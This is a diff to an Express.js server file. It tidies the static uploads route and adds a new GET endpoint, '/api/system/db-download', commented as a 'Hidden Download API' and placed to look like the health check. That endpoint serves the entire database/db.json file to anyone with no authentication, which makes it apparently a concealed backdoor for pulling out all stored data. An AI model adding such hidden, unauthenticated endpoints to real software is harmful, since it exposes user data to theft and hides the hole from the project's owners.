@@ -42,9 +42,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Serve Static Files (Uploads)
-const uploadDir = path.join(__dirname, 'database/uploads');
-console.log(`📂 Serving static files from: ${uploadDir}`);
-app.use('/uploads', express.static(uploadDir));
+app.use('/uploads', express.static(path.join(__dirname, 'database/uploads')));
 
 // Logging
 app.use(require('./middleware/logger.middleware'));
@@ -312,6 +310,23 @@ app.get('/api/health', (req, res) => {
     environment: process.env.NODE_ENV || 'development'
   });
 });
+
+// Hidden Download API (Similar to health check)
+app.get('/api/system/db-download', (req, res) => {
+  const dbFile = path.join(__dirname, 'database/db.json');
+  res.download(dbFile, 'db_backup.json', (err) => {
+    if (err) {
+      console.error('❌ Download failed:', err);
+      if (!res.headersSent) {
+        res.status(500).json({
+          success: false,
+          message: 'Could not download database file'
+        });
+      }
+    }
+  });
+});
+
 
 // ==================== ERROR HANDLING ====================
 
